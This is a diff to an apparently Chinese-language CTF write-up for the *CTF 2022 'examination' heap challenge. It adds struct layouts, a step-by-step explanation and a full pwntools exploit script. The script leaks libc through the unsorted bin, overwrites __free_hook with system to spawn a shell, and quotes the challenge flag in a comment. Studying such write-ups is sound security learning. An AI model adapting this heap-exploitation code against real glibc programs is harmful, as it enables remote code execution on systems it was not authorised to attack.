@@ -16,11 +16,15 @@
 >
 > https://github.com/sixstars/starctf2022/tree/main/pwn-examination  official wp
 >
-> https://blog.csdn.net/Azyka/article/details/124286497 without exit hook
+> https://blog.csdn.net/Azyka/article/details/124286497 FSOP, no exit hook
+>
+> https://blog.csdn.net/weixin_52640415/article/details/124231298 no exit hook, no FSOP
 >
 > 赛时找完vul想完思路后就去做re了（因为有师傅已经出了），赛后搜了下，解法挺多的，看各路神仙的做法学到了很多，遂详细分析不同解法涉及到的知识点，尽我所能详细讲述，同时总结知识点，学习不懂的地方。
 
 不同解法还没写完，而且本地测试有问题，还在探索。本地tcache貌似会出错，具体位置在i64`add_student`的汇编处有注释。
+
+最简单的解法是利用unsorted bin泄露libc，然后改free hook为system，`free(addr)->system("/bin/sh\0")`
 
 
 
@@ -37,18 +41,19 @@
 ```cpp
 struct stu:   0x20 size, 0x30 chunk size                    0x31
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|8-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+16
-|        info ptr                      |                                           |
+|              p2info                  |                                           |
 |  pray set:mode ptr; unset:prayscore  |+0x18       pray      | +0x1C   reward     |
 |       x invalid addr x               |         next chunk size field             |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|
     
 struct info:  student information                            0x21
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|8-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+16
-|        Qnum       |+4    score       |              ptr to review                |
+|        Qnum       |+4    score       |                 p2review                  |
 |        review_size (int)             |         next chunk size field             |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|
 
 mode: 0x31 chunk, to store mode str of a student. 当pray set且stu+0x10处不为null，stu.mod(stu+0x10)才会存储mode的地址
+review: user input size, size stored in info+0x10. 用于存储teacher写的review
 // 需要注意，在gef中，每8B为一组展示时(x /20xg addr)，最右端的数字才是最低地址处的值，与上面展示的内存视图会有顺序上的不同，可对照IDA分析
 x /10xg 0x555555f212f0-0x10 // 某个stu chunk内存上的视图如下：
 0x555555f212e0: 0x0000000000000000      0x0000000000000031
@@ -95,7 +100,7 @@ x /10xg 0x555555f212f0-0x10 // 某个stu chunk内存上的视图如下：
 
 
 
-# exp: unsorted bin leak
+# exp: unsorted bin leak + exit hook
 
 1. 调用几次`add_student`，Qnum=1. stu1 pray set，`give_score`产生unsigned int 下溢，stu1.info.score变成很大的整数
 2. 调用`set_mode`，给stu1 calloc出mode(0x30)。stu1 pray unset，调用`set_mode`输入pray score，覆盖掉stu[1].mode处存储的指针的最低1B，使其指向更高地址的stu[2] chunk addr-0x10
@@ -297,6 +302,171 @@ p.interactive()
 
 
 
+
+# exp: unsorted bin + free hook
+
+> info指0x20大小的chunk，是0x30大小的stu结构体的第一个地址所指向的结构体，review指的是comment
+
+核心在于放一个chunk到unsorted bin，然后拿回一个chunk，该chunk可以控制另一stu的`0x30, 0x20`的chunk，利用stu.info.p2review这个指针，以及review的可编辑，覆盖free hook为system
+
+1. unsigned underflow: calloc 3个stu，stu0的review chk size=`0x390`自始至终只有stu0是pray set的，stu2是为了避免top chunk合并。give score，stu0的score整数下溢
+2. increase chk size: 利用任意地址加一，让stu0的review chk size=`0x490`。此时这个chunk实际上已经包括了stu1的`0x30,0x20`的chunk
+3. to unsorted bin: free掉`0x490`的chk (stu0.review)到unsorted bin，为了后面calloc回来的chk可以编辑stu1的数据，先calloc一个stu (new stu2)，从unsorted bin拿`0x30,0x20`的chk
+4. leak libc: 给new stu2 calloc一个`0x390`的chk，这个chk的区域会覆盖住stu1的`0x30,0x20` chk。覆盖stu1.p2info到一个可控制的地址，在这个地址上构造一个fake info，fake_info.p2review指向unsorted bin里的chk的地址，然后就可以输出stu1.review达到输出unsorted bin上libc地址的目的
+5. cover free hook to system, get shell: 同样利用stu2.review，控制stu1.p2info指向fake info，fake info.p2review指向 `&__free_hook`，编辑stu1.review改`__free_hook`的值为`&system`，同时stu2.review=`"/bin/sh\0"`。调用`free(&stu2.review)`变成了 `system(&"/bin/sh\0")`
+
+```python
+from pwn import *
+context.arch = "amd64"
+context.log_level = "debug"
+IP = "172.0.0.0"
+PORT = 123
+DEBUG = 1
+
+if DEBUG:
+    p = process("./examination")
+    base = p.libs()[p._cwd + p.argv[0].decode().strip(".")]  # fix bytes str error in py3.9
+    success("base:", base, p.libs())
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+else:
+    p = remote(IP, PORT)  # *ctf{ret2sch00l_ret2examination_0nce_ag@1n!}
+    libc = ELF("./libc-2.31.so")
+
+
+def ru(x): return p.recvuntil(x)
+def se(x): return p.send(x)
+def rl(): return p.recvline()
+def sl(x): return p.sendline(x)
+def rv(x): return p.recv(x)
+def sa(a, b): return p.sendafter(a, b)
+def sla(a, b): return p.sendlineafter(a, b)
+def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass
+def lg(s): return log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
+
+
+def debug(cmd=""):
+    gdb.attach(p, cmd)
+
+
+def dd():
+    if DEBUG:
+        cmd = ""
+        # cmd += "b *%d\n" % (base + 0x15D5)
+        # cmd += "b *%d\n" % (base + 0x154D)
+        cmd += "set $a=%d\n" % (base + 0x5080)  # arrPtr
+        debug(cmd)
+
+
+def menu(choice):
+    sla("choice>> ", str(choice))
+
+
+def add_student(Qnum=1):
+    menu(1)
+    sla("enter the number of questions: ", str(Qnum))
+
+
+def give_score():
+    menu(2)
+
+
+def write_review(index, size, ctx):  # size [1, 0x3ff]
+    menu(3)
+    sla("which one? > ", str(index))
+    if(size > 0):
+        sla("please input the size of comment: ", str(size))
+    sa("enter your comment:", ctx)
+
+
+def call_parent(index):
+    menu(4)
+    sla("which student id to choose?", str(index))
+
+
+def change_id(id):
+    menu(6)
+    sla("input your id: ", str(id))
+
+
+def change_role(role):
+    menu(5)
+    sla("role: <0.teacher/1.student>: ", str(role))
+
+
+def pray():
+    menu(3)
+
+
+def set_mode(ctx, score=0):
+    menu(4)
+    if score > 0:
+        sla("enter your pray score: 0 to 100", str(score))
+    else:
+        sa("enter your mode!", ctx)
+
+
+# Step-1: new students, stu0 pray set, give score, stu0 score underflow
+sla('role: <0.teacher/1.student>: ', str(0))
+
+add_student()  # 0
+write_review(0, 0x380, "stu000000000")  # stu0.review chk size=0x391
+add_student()  # 1
+write_review(1, 0xa0, "stu11111111")
+add_student()  # 2
+
+
+change_role(1)  # to stu0
+pray()  # stu0 pray set
+change_role(0)  # to teacher
+give_score()  # stu0 score < 0
+
+# Step-2: leak heap addr and let stu0.review chk_size from 0x391 to 0x491
+change_role(1)  # to stu0
+menu(2)  # stu0 pray set, so return &stu0, add 1 to an address
+ru("0x")
+stu0base = int("0x" + str(p.recv(12), encoding="utf-8"), 16)
+heap_base = stu0base - 0x2a0
+sla('add 1 to wherever you want! addr: ', str(heap_base + 0x2e9) + '0')
+success("heap_base:" + hex(heap_base) + "stu0base:" + hex(stu0base))
+
+# Step-3: delete stu0, stu0.review(0x490) to unsorted bin, new stu, get chk from unsorted bin
+change_role(0)  # to teacher
+call_parent(0)  # stu0.review to unsorted bin 0x490 # stu0 to tcache(0x30) stu0.info to tcache(0x30)
+add_student()  # new stu2, old stu2 covered by this new stu2
+# calloc get unsorted bin first, NOT tcache
+# 0x490-0x30-0x20 # now unsorted: 0x440
+
+# Step-4: get 0x390 from unsorted, cover stu1 and stu1.info
+# let stu1.pinfo->fake_info, fake_info.p2review->chk in unsorted bin. print stu1.review, leak libc
+# now unsorted: 0xb0
+write_review(2, 0x388, p64(0xdeadbeef).ljust(0x338, b"\0") +
+             flat(0x31, heap_base + 0x6b0, 0, 0, 0, 0, 0x21, 1, heap_base + 0x6d0, 0xa0))
+# cover stu1 chksize=0x31, stu1.pinfo=heap_base + 0x6b0 (fake stu1.info construct later)
+# fake stu1.info: chksize=0x21, Qnum=1; ptr2review=chk in unsorted bin ; review_size=0xa0
+
+# now stu1.info.preview point to unsorted bin chk(0xb0), now leak libc(stu1.review)
+change_role(1)  # to student
+change_id(1)  # to stu1
+menu(2)  # stu1 pray NOT set, print review only
+libc_addr = l64()  # leak libc
+libc_base = libc_addr - 0x70 - libc.sym["__malloc_hook"]  # for local/remote libc compatibility
+libc.address = libc_base
+success("libc_addr:" + hex(libc_addr) + " libc_base:" + hex(libc_base))
+
+# Step-5: cover stu2.review="/bin/sh\0", cover __free_hook to &system, trigger system("/bin/sh\0")
+change_role(0)  # to teacher
+write_review(2, 0, b"/bin/sh\0" + b"\0" * 0x330 + flat(0x31, heap_base + 0x6b0,
+             0, 0, 0, 0, 0x21, 1, libc.sym["__free_hook"], 8))
+# stu1.pinfo->fake_stuinfo, fake_stuinfo.p2review->&__free_hook
+write_review(1, 0, p64(libc.sym["system"]))  # x/2xg &__free_hook is &system now
+# cover free_hook i.e. stu1.info.review to &system
+dd()  # DEBUG:
+call_parent(2)  # free stu2
+# origin: free(&stu2.review)# now: system("/bin/sh\0") # &stu2.review is &"/bin/sh\0" now
+
+p.interactive()
+
+```
 
 
 
